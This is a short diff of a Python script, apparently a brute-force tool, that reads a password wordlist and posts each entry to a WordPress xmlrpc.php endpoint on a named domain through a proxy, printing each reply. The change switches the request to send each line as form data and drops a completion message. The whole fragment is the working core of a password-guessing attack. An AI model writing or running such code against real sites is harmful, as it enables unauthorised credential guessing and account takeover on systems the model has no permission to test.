@@ -18,10 +18,9 @@ with open(wordlist, 'r') as f:
      for line in f.read().splitlines():
         passwds = line
         print(line)
-        r =requests.post('http://macaxeirateste.tk/xmlrpc.php', line, proxies=proxiesdef)
+        r =requests.post('http://macaxeirateste.tk/xmlrpc.php', data=line, proxies=proxiesdef)
         print(r.text)
-     else: 
-        print("Finished")
+
      
     
 #data = {'username':'Olivia','password':'123'}
